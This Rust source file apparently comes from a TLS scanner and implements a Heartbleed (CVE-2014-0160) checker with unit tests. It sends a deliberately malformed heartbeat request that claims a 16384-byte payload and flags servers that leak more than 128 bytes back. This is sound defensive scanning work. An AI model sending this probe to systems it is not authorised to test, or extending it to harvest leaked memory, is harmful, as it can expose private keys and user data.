// Heartbleed (CVE-2014-0160) vulnerability checker

use crate::Result;
use crate::constants::{
    CONTENT_TYPE_HEARTBEAT, HEARTBEAT_REQUEST, TLS_HANDSHAKE_TIMEOUT, VERSION_TLS_1_2,
};
use crate::protocols::{Protocol, handshake::ClientHelloBuilder};
use crate::utils::network::Target;
use std::time::Duration;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::time::timeout;

/// Heartbleed detection result with detailed information
#[derive(Debug, Clone)]
pub struct HeartbleedResult {
    pub vulnerable: bool,
    pub bytes_received: usize,
    pub bytes_sent: usize,
    pub details: String,
    /// Whether the test was actually performed (false if connection/parsing failed)
    pub tested: bool,
}

/// Heartbleed vulnerability tester
pub struct HeartbleedTester<'a> {
    target: &'a Target,
    connect_timeout: Duration,
    read_timeout: Duration,
}

impl<'a> HeartbleedTester<'a> {
    /// Create new Heartbleed tester
    pub fn new(target: &'a Target) -> Self {
        Self {
            target,
            connect_timeout: Duration::from_secs(10),
            read_timeout: TLS_HANDSHAKE_TIMEOUT,
        }
    }

    /// Test for Heartbleed vulnerability
    /// CVE-2014-0160: TLS Heartbeat Extension memory disclosure
    pub async fn test(&self) -> Result<HeartbleedResult> {
        for protocol in [Protocol::TLS10, Protocol::TLS11, Protocol::TLS12] {
            let result = self.test_protocol(protocol).await?;
            if result.vulnerable {
                return Ok(result);
            }
        }

        Ok(HeartbleedResult {
            vulnerable: false,
            bytes_received: 0,
            bytes_sent: 3,
            details: "Not vulnerable - No memory leak detected across TLS 1.0/1.1/1.2".to_string(),
            tested: true,
        })
    }

    /// Test specific protocol for Heartbleed
    async fn test_protocol(&self, protocol: Protocol) -> Result<HeartbleedResult> {
        let addr = self.target.socket_addrs()[0];

        // Connect TCP
        let mut stream =
            match crate::utils::network::connect_with_timeout(addr, self.connect_timeout, None)
                .await
            {
                Ok(s) => s,
                Err(_) => {
                    return Ok(HeartbleedResult {
                        vulnerable: false,
                        bytes_received: 0,
                        bytes_sent: 0,
                        details:
                            "Connection failed - Vulnerability status UNKNOWN (unable to test)"
                                .to_string(),
                        tested: false,
                    });
                }
            };

        // Build ClientHello with Heartbeat extension
        let mut builder = ClientHelloBuilder::new(protocol);
        builder.add_ciphers(&[0xc014, 0xc00a, 0x0039, 0x0038, 0x0035]);

        // Add heartbeat extension (type 0x000f)
        let heartbeat_ext = vec![0x01]; // peer_allowed_to_send
        builder.add_extension(crate::protocols::Extension::new(0x000f, heartbeat_ext));

        let client_hello = builder.build_with_defaults(Some(&self.target.hostname))?;

        // Send ClientHello
        let response = match timeout(self.read_timeout, async {
            stream.write_all(&client_hello).await?;

            // Read ServerHello
            let mut resp = vec![0u8; 16384];
            let n = stream.read(&mut resp).await?;
            resp.truncate(n);
            Ok::<Vec<u8>, anyhow::Error>(resp)
        })
        .await
        {
            Ok(Ok(resp)) if !resp.is_empty() => resp,
            _ => {
                return Ok(HeartbleedResult {
                    vulnerable: false,
                    bytes_received: 0,
                    bytes_sent: 0,
                    details: "ServerHello timeout or empty response".to_string(),
                    tested: false,
                });
            }
        };

        // Check if server accepted heartbeat extension
        if !self.check_heartbeat_extension(&response) {
            return Ok(HeartbleedResult {
                vulnerable: false,
                bytes_received: 0,
                bytes_sent: 0,
                details: "Heartbeat extension not supported by server".to_string(),
                tested: true,
            });
        }

        // Send malicious heartbeat request
        self.send_malicious_heartbeat(&mut stream).await
    }

    /// Check if ServerHello contains heartbeat extension.
    /// Parses the TLS ServerHello structure to find extensions, avoiding
    /// false positives from matching 0x000f in session ID or other fields.
    fn check_heartbeat_extension(&self, data: &[u8]) -> bool {
        // TLS ServerHello minimum: 5 (record) + 4 (handshake) + 2 (version) + 32 (random) + 1 (sid len) = 44
        if data.len() < 44 {
            return false;
        }

        // Verify this is a Handshake record (0x16) containing ServerHello (0x02)
        if data[0] != 0x16 || data[5] != 0x02 {
            return false;
        }

        // Session ID length at offset 43
        let sid_len = data[43] as usize;
        // After session ID: cipher suite (2 bytes) + compression method (1 byte)
        let ext_offset = 44 + sid_len + 2 + 1;

        // Check we have room for extensions length (2 bytes)
        if ext_offset + 2 > data.len() {
            return false;
        }

        let ext_total_len = u16::from_be_bytes([data[ext_offset], data[ext_offset + 1]]) as usize;
        let ext_start = ext_offset + 2;
        let ext_end = (ext_start + ext_total_len).min(data.len());

        // Walk extensions looking for heartbeat (type 0x000f)
        let mut pos = ext_start;
        while pos + 4 <= ext_end {
            let ext_type = u16::from_be_bytes([data[pos], data[pos + 1]]);
            let ext_len = u16::from_be_bytes([data[pos + 2], data[pos + 3]]) as usize;
            pos += 4;

            if ext_type == 0x000f {
                return true;
            }

            pos += ext_len;
        }

        false
    }

    /// Send malicious heartbeat request and check for memory leak
    async fn send_malicious_heartbeat(&self, stream: &mut TcpStream) -> Result<HeartbleedResult> {
        const HEARTBEAT_PAYLOAD_SENT: usize = 3;
        // Minimum suspicious response threshold.
        // A legitimate heartbeat response echoes our 3 bytes payload plus 3 bytes header (type + length).
        // TLS record overhead: 5 bytes (content type + version + length).
        // Total legitimate: ~11 bytes minimum. We use 128 as a conservative threshold
        // to avoid false positives from servers that include additional metadata.
        // The malicious payload claims 0x4000 (16384) bytes, so any response >128 is suspicious.
        // See: CVE-2014-0160 - heartbeat allows reading up to 64KB of memory.
        const MIN_SUSPICIOUS_RESPONSE: usize = 128;

        // Build malicious heartbeat request
        let mut heartbeat = Vec::new();

        // Record header
        heartbeat.push(CONTENT_TYPE_HEARTBEAT); // Content Type: Heartbeat (0x18)
        heartbeat.push((VERSION_TLS_1_2 >> 8) as u8); // Version: TLS 1.2 (0x0303)
        heartbeat.push((VERSION_TLS_1_2 & 0xff) as u8);

        // Record length
        heartbeat.push(0x00);
        heartbeat.push(0x03); // 3 bytes payload

        // Heartbeat request
        heartbeat.push(HEARTBEAT_REQUEST); // Type: Request (0x01)
        heartbeat.push(0x40); // Payload length: 16384 (0x4000) - MALICIOUS!
        heartbeat.push(0x00);

        // Send heartbeat request
        match timeout(self.read_timeout, async {
            stream.write_all(&heartbeat).await?;

            // Read response
            let mut response = vec![0u8; 65535];
            stream.read(&mut response).await
        })
        .await
        {
            Ok(Ok(n)) => {
                let vulnerable = n > MIN_SUSPICIOUS_RESPONSE;
                let details = if vulnerable {
                    format!(
                        "VULNERABLE: Heartbleed detected. Received {} bytes (sent only {} bytes). Memory leak confirmed.",
                        n, HEARTBEAT_PAYLOAD_SENT
                    )
                } else if n == 0 {
                    "Connection closed by server - likely not vulnerable (server rejected malformed heartbeat)".to_string()
                } else {
                    format!(
                        "Not vulnerable - Received {} bytes (expected echo of {} bytes, threshold: {})",
                        n, HEARTBEAT_PAYLOAD_SENT, MIN_SUSPICIOUS_RESPONSE
                    )
                };

                Ok(HeartbleedResult {
                    vulnerable,
                    bytes_received: n,
                    bytes_sent: HEARTBEAT_PAYLOAD_SENT,
                    details,
                    tested: true,
                })
            }
            Ok(Err(_)) => Ok(HeartbleedResult {
                vulnerable: false,
                bytes_received: 0,
                bytes_sent: HEARTBEAT_PAYLOAD_SENT,
                details:
                    "Connection error during heartbeat test - server may have closed connection"
                        .to_string(),
                tested: false,
            }),
            Err(_) => Ok(HeartbleedResult {
                vulnerable: false,
                bytes_received: 0,
                bytes_sent: HEARTBEAT_PAYLOAD_SENT,
                details:
                    "Timeout waiting for heartbeat response - server may have closed connection"
                        .to_string(),
                tested: false,
            }),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::net::{IpAddr, Ipv4Addr};
    use tokio::net::TcpListener;

    async fn spawn_heartbeat_server(response_size: usize) -> u16 {
        let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let port = listener.local_addr().unwrap().port();

        tokio::spawn(async move {
            if let Ok((mut socket, _)) = listener.accept().await {
                let mut buffer = [0u8; 4096];
                let _ = socket.read(&mut buffer).await;
                let response = vec![0u8; response_size];
                let _ = socket.write_all(&response).await;
            }
        });

        port
    }

    #[tokio::test]
    #[ignore] // Requires network access
    async fn test_heartbleed_modern_server() {
        let target = Target::parse("www.google.com:443")
            .await
            .expect("test assertion should succeed");
        let tester = HeartbleedTester::new(&target);

        let result = tester.test().await.expect("test assertion should succeed");

        // Google should not be vulnerable
        assert!(!result.vulnerable);
    }

    #[test]
    fn test_heartbeat_extension_check() {
        let target = Target::with_ips(
            "test.com".to_string(),
            443,
            vec!["127.0.0.1".parse().unwrap()],
        )
        .unwrap();
        let tester = HeartbleedTester {
            target: &target,
            connect_timeout: Duration::from_secs(5),
            read_timeout: Duration::from_secs(5),
        };

        // Build a minimal valid ServerHello with heartbeat extension (0x000f)
        // Record: type=0x16, version=0x0303, length=TBD
        // Handshake: type=0x02, length=TBD
        // ServerHello: version=0x0303, random(32), sid_len=0, cipher=0x1301, compress=0x00
        // Extensions: len=TBD, ext_type=0x000f, ext_len=1, ext_data=0x01
        let mut data_with_ext = vec![
            0x16, 0x03, 0x03, 0x00, 0x00, // TLS record header (length placeholder)
            0x02, 0x00, 0x00, 0x00, // Handshake header (length placeholder)
            0x03, 0x03, // ServerHello version TLS 1.2
        ];
        data_with_ext.extend_from_slice(&[0xAA; 32]); // 32 bytes random
        data_with_ext.push(0x00); // session_id_length = 0
        data_with_ext.extend_from_slice(&[0x13, 0x01]); // cipher suite
        data_with_ext.push(0x00); // compression method
        // Extensions: total length=7, heartbeat ext (type=0x000f, len=1, data=0x01)
        data_with_ext.extend_from_slice(&[0x00, 0x07]); // extensions total length
        data_with_ext.extend_from_slice(&[0x00, 0x0f]); // ext type: heartbeat
        data_with_ext.extend_from_slice(&[0x00, 0x01]); // ext length
        data_with_ext.push(0x01); // heartbeat mode: peer_allowed_to_send
        // Patch record and handshake lengths
        let record_len = (data_with_ext.len() - 5) as u16;
        data_with_ext[3] = (record_len >> 8) as u8;
        data_with_ext[4] = (record_len & 0xff) as u8;
        let hs_len = (data_with_ext.len() - 9) as u32;
        data_with_ext[6] = ((hs_len >> 16) & 0xff) as u8;
        data_with_ext[7] = ((hs_len >> 8) & 0xff) as u8;
        data_with_ext[8] = (hs_len & 0xff) as u8;

        assert!(tester.check_heartbeat_extension(&data_with_ext));

        // Same ServerHello but WITHOUT the heartbeat extension (no extensions)
        let mut data_without_ext = vec![
            0x16, 0x03, 0x03, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x03, 0x03,
        ];
        data_without_ext.extend_from_slice(&[0xAA; 32]);
        data_without_ext.push(0x00);
        data_without_ext.extend_from_slice(&[0x13, 0x01]);
        data_without_ext.push(0x00);
        let record_len = (data_without_ext.len() - 5) as u16;
        data_without_ext[3] = (record_len >> 8) as u8;
        data_without_ext[4] = (record_len & 0xff) as u8;
        let hs_len = (data_without_ext.len() - 9) as u32;
        data_without_ext[6] = ((hs_len >> 16) & 0xff) as u8;
        data_without_ext[7] = ((hs_len >> 8) & 0xff) as u8;
        data_without_ext[8] = (hs_len & 0xff) as u8;
        assert!(!tester.check_heartbeat_extension(&data_without_ext));
    }

    #[test]
    fn test_heartbeat_extension_short_data_false() {
        let target = Target::with_ips(
            "test.com".to_string(),
            443,
            vec!["127.0.0.1".parse().unwrap()],
        )
        .unwrap();
        let tester = HeartbleedTester {
            target: &target,
            connect_timeout: Duration::from_secs(5),
            read_timeout: Duration::from_secs(5),
        };

        assert!(!tester.check_heartbeat_extension(&[0x00]));
    }

    #[test]
    fn test_heartbeat_extension_exact_two_bytes() {
        let target = Target::with_ips(
            "test.com".to_string(),
            443,
            vec!["127.0.0.1".parse().unwrap()],
        )
        .unwrap();
        let tester = HeartbleedTester {
            target: &target,
            connect_timeout: Duration::from_secs(5),
            read_timeout: Duration::from_secs(5),
        };

        // Two bytes alone is insufficient - need at least 3 bytes for the search loop
        // (saturating_sub(2) means we need at least 3 to have one iteration)
        // This test validates that minimum length is enforced
        assert!(!tester.check_heartbeat_extension(&[0x00, 0x0f]));
    }

    #[tokio::test]
    async fn test_send_malicious_heartbeat_detects_leak() {
        let port = spawn_heartbeat_server(256).await;
        let target = Target::with_ips(
            "localhost".to_string(),
            port,
            vec![IpAddr::V4(Ipv4Addr::LOCALHOST)],
        )
        .unwrap();
        let tester = HeartbleedTester::new(&target);
        let addr = target.socket_addrs()[0];
        let mut stream = TcpStream::connect(addr).await.unwrap();
        let result = tester.send_malicious_heartbeat(&mut stream).await.unwrap();
        assert!(result.vulnerable);
        assert!(result.bytes_received > 128);
    }

    #[tokio::test]
    async fn test_send_malicious_heartbeat_no_leak() {
        let port = spawn_heartbeat_server(10).await;
        let target = Target::with_ips(
            "localhost".to_string(),
            port,
            vec![IpAddr::V4(Ipv4Addr::LOCALHOST)],
        )
        .unwrap();
        let tester = HeartbleedTester::new(&target);
        let addr = target.socket_addrs()[0];
        let mut stream = TcpStream::connect(addr).await.unwrap();
        let result = tester.send_malicious_heartbeat(&mut stream).await.unwrap();
        assert!(!result.vulnerable);
    }
}
